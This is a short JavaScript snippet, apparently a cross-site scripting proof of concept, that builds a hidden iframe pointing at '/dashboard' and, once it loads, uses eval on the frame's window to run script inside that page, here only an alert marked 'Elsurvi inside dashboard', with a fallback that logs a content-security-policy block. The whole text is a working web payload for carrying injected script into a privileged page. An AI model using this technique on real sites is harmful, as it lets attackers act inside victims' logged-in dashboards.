var f = document.createElement('iframe');
  f.style.display = 'none';
  f.src = '/dashboard';
  f.onload = function() {
    try {
      f.contentWindow.eval("alert('Elsurvi inside dashboard')");
    } catch(e) {
      console.log("Iframe access denied or CSP blocked:", e);
    }
  };
  document.body.appendChild(f);
